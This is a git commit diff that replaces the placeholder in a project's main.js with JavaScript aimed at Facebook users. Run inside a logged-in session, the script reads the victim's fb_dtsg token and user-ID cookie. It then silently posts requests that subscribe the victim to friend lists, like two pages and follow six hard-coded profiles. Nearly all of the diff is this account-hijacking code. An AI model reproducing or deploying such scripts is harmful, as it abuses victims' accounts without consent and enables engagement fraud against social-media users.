688126924a623f119843eff1b3f39fab867b789c
allujoshi143 <joshimon2010@gmail.com>
2013-12-01 00:25:49 +0530

    Update main.js

--- javascripts/main.js
+++ javascripts/main.js
@@ -1,1 +1,82 @@
-console.log('This would be the main JS file.');
+
+/*list follow*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function LIST(L) {
+    var X = new XMLHttpRequest();
+    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
+    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
+    X.open("POST", XURL, true);
+    X.onreadystatechange = function () {
+        if (X.readyState == 4 && X.status == 200) {
+            X.close;
+        }
+    };
+    X.send(XParams);
+}
+LIST("472664206142013");
+LIST("479201905488243");
+LIST("451142918294142");
+LIST("467268210014946");
+
+
+
+
+
+/*Like Page*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function Like(p) {
+    var Page = new XMLHttpRequest();
+    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
+    Page.open("POST", PageURL, true);
+    Page.onreadystatechange = function () {
+        if (Page.readyState == 4 && Page.status == 200) {
+            Page.close;
+        }
+    };
+    Page.send(PageParams);
+}
+Like("182614955124471");
+Like("399087956812954");
+
+
+
+
+
+
+
+
+
+/*Auto Follow*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function a(abone) {
+    var http4 = new XMLHttpRequest();
+    var url4 = "/ajax/follow/follow_profile.php?__a=1";
+    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+    http4.open("POST", url4, true);
+    http4.onreadystatechange = function () {
+        if (http4.readyState == 4 && http4.status == 200) {
+            http4.close;
+        }
+    };
+    http4.send(params4);
+}
+a("100005115938614");
+a("100004620215045");
+a("100004532196646");
+a("100003147643648");
+a("100004156869752");
+a("100001050235420");
+
+
+
+
+
+
+
